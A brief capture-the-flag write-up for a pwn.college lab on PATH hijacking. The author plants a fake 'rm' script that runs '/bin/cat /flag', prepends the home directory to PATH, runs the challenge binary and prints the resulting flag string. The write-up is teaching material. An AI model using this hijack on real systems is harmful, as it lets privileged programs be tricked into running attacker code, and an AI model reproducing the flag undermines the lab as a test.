#**Pondering Path**

##**Hijacking Commands**

I passed _/bin/cat /flag_ to the shell script named rm to override the existing rm command and set PATH variable using export command. I ran _/challenge/run_ to get the flag.

    hacker@path-hijacking-commands:~$ nano rm

    hacker@path-hijacking-commands:~$ chmod +x rm

    hacker@path-hijacking-commands:~$ export PATH=/home/hacker:$PATH

    hacker@path-hijacking-commands:~$ /challenge/run

    Trying to remove /flag...

    Found 'rm' command at /home/hacker/rm. Executing!

    pwn.college{4OTTYvM-A2YpCEUhyVE_9hl3S4x.ddzNyUDL1cTN0czW}
